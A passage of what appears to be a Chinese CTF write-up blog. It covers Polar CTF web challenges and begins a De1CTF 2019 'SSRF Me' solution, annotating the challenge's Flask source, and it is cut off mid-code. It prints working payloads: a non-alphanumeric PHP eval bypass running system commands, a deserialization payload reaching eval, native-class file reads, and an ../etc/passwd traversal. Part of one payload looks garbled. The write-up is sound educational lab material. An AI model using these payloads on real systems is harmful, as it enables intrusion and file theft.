class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-comment">//无数字字母绕过</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!&quot;</span>);<br>&#125;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?a=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#xx27;_&#xbr><br>POST:<br>_=system(&#x27;ls ./&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923131600566.png" alt="image-20230923131600566"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?a=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#xx27;_&#xbr><br>POST:<br>_=system(&#x27;cat ./zheshiflag.php &#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923131710886.png" alt="image-20230923131710886"></p><h4 id="php-very-nice"><a href="#php-very-nice" class="headerlink" title="php very nice:"></a>php very nice:</h4><p>构造序列化字符串:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example</span></span><br><span class="hljs-class"> </span>&#123;<br>     <span class="hljs-keyword">public</span> <span class="hljs-variable">$sys</span>=<span class="hljs-string">&#x27;Can you find the leak?&#x27;</span>;<br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;sys);<br>     &#125;<br> &#125;<br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>();<br><span class="hljs-variable">$obj</span>-&gt;sys = <span class="hljs-string">&quot;system(&#x27;cat ./flag.php&#x27;);&quot;</span>;<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>;<br><br> <span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?a=O%3A7%3A%22Example%22%3A1%3A%7Bs%3A3%3A%22sys%22%3Bs%3A25%3A%22system%28%27cat+.%2Fflag.php%27%29%3B%22%3B%7D<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923162344694.png" alt="image-20230923162344694"></p><h4 id="代码审计1"><a href="#代码审计1" class="headerlink" title="代码审计1:"></a>代码审计1:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$sys</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sys&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;|flag|&quot;</span>, <span class="hljs-variable">$xsx</span>)) &#123;<br>           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;flag is no here!&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$xsx</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xsx&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$sys</span>(<span class="hljs-variable">$xsx</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?sys=FilesystemIterator&amp;xsx=./<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923164401248.png" alt="image-20230923164401248"></p><p>使用php原生类返回flag.php的内容:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?sys=SplFileObject&amp;xsx=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923172559963.png" alt="image-20230923172559963"></p><p><img src="/images/2023-9-24-Polar/image-20230923172610960.png" alt="image-20230923172610960"></p><h4 id="自由的文件上传系统："><a href="#自由的文件上传系统：" class="headerlink" title="自由的文件上传系统："></a>自由的文件上传系统：</h4><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">sectet_include.php?file=upload/../sectet_include.php<br>/var/www/html/upload/4382754064<br></code></pre></td></tr></table></figure><p>使用dirsearch：<br><img src="/images/2023-9-24-Polar/image-20230923155441868.png" alt="image-20230923155441868"></p><p><img src="/images/2023-9-24-Polar/image-20230923155509582.png" alt="image-20230923155509582"></p><p><img src="/images/2023-9-24-Polar/image-20230923155519918.png" alt="image-20230923155519918"></p><p>发现有.git泄露，但是.git泄露我没发现有用信息</p><p>.DS_Store:泄露也没有有用文件</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">sectet_include.php?file=../../../etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923180939030.png" alt="image-20230923180939030"></p><p>存在文件目录穿越，不过到最后也没有穿越出来。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[De1CTF 2019]SSRF Me 题解</title>
    <link href="/2023/08/29/2023-08-29-%5BDe1CTF%202019%5DSSRF%20Me/"/>
    <url>/2023/08/29/2023-08-29-%5BDe1CTF%202019%5DSSRF%20Me/</url>
    
    <content type="html"><![CDATA[<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>1.查看提示:<br><img src="/images/2023-8-29-SSRFMe/image-20230829102629610.png" alt="image-20230829102629610"></p><p>2.打开网页:<br><img src="/images/2023-8-29-SSRFMe/image-20230829102651916.png" alt="image-20230829102651916"></p><p>观察代码，感觉是flask注入,整理代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#! /usr/bin/env python #encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br>app = Flask(__name__)<br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):<br>            <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(resp)<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br><br>                <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br><br><br>            <span class="hljs-keyword">else</span>:<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>                result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>            <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-comment"># generate Sign For Action Scan.</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> (waf(param)):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><p>3.代码审计:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#! /usr/bin/env python #encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br>app = Flask(__name__)<br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-comment"># 有参初始化一个Task对象</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        <span class="hljs-comment"># 将客户端的ip地址进行md5加密</span><br>        self.sandbox = md5(ip)<br>        <span class="hljs-comment"># 判断该ip地址是否存在</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):<br>            <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            <span class="hljs-comment"># 如果该ip地址不存在，则为该ip地址创建一个目录，使该ip地址能够访问该网站文件</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 申请一个result字典</span><br>        result = &#123;&#125;<br>        <span class="hljs-comment"># &#123;&#x27;code&#x27;: 500&#125;</span><br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-comment"># md5(secert_key + param + action)=sign</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                <span class="hljs-comment"># 打开result.txt文件，并用tmpfile指代该文件</span><br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                <span class="hljs-comment"># 获取param路径下的文件内容，并存储到resp中</span><br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment"># 读取到param文件下的内容时，将该文件内容打印，但是该打印的内容无法呈现到网页中，只能呈现在编译器中</span><br>                    <span class="hljs-comment"># 所以无法利用其查看resp的内容</span><br>                    <span class="hljs-built_in">print</span>(resp)<br>                    <span class="hljs-comment"># 将读取的文件内容写入tmofile中</span><br>                    tmpfile.write(resp)<br>                    <span class="hljs-comment"># 关闭文件tmpfile</span><br>                    tmpfile.close()<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                    <span class="hljs-comment"># 再次读取result.txt文件</span><br>                    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                    <span class="hljs-comment"># 将读取的文件内容存储到result字典中</span><br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br><br>                <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 如果action中没有scan则返回错误</span><br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>                result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>            <span class="hljs-keyword">return</span> result<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 对该对象的action和param进行md5加密，判断加密结果和该对象的sign是否相等</span><br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-comment"># generate Sign For Action Scan.</span><br><br><span class="hljs-comment"># 访问url/geneSig时，该网页支持get和post请求</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    <span class="hljs-comment"># request.args.get()获取参数param的值</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    <span class="hljs-comment"># 设置参数action的值为scan</span><br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-comment"># 执行getSign()函数</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><span class="hljs-comment"># 访问url/De1ta时，该网页支持GET和POST请求</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    <span class="hljs-comment"># 从cookie中获取参数action的值</span><br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    <span class="hljs-comment"># 从get方法中获取参数param的值</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    <span class="hljs-comment"># 从cookie中获取sign的值</span><br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    <span class="hljs-comment"># ip存储客户端的ip地址</span><br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> (waf(param)):<br>        <span class="hljs-comment"># 查看输入的param中是否存在非法字符</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    <span class="hljs-comment"># 有参数申请一个Task类，用task存储该对象</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-comment"># 返回一个json文件流到网页上，即显示task.Exec()文件内容</span><br>    <span class="hljs-comment"># 即显示result存储的内容</span><br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><span class="hljs-comment"># 访问url/的网址时，执行index()函数</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-comment"># 打开并读取code.txt文件</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 读取param路径下的文件内容</span><br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection 